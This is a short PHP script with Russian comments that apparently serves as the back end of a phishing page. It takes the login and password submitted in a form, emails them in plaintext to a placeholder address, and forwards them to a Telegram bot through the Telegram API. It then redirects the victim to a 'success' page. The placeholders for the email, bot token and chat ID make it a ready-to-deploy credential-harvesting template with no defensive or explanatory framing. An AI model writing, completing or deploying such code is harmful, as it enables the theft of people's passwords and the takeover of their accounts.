<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['login'];
    $password = $_POST['password'];

    // Отправка данных на почту
    $to = 'your-email@example.com';  // Замените на ваш email
    $subject = 'Новый логин и пароль';
    $message = "Логин: $login\nПароль: $password";
    $headers = 'From: noreply@yourdomain.com' . "\r\n" .
               'Reply-To: noreply@yourdomain.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    mail($to, $subject, $message, $headers);

    // Отправка данных в Telegram
    $telegram_token = 'your-telegram-bot-token';  // Замените на ваш токен бота
    $telegram_chat_id = 'your-chat-id';  // Замените на ваш ID чата

    $telegram_message = "Логин: $login\nПароль: $password";

    $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($telegram_message);

    file_get_contents($url);

    // Перенаправление на страницу успеха
    header("Location: success.html");
    exit();
}
?>
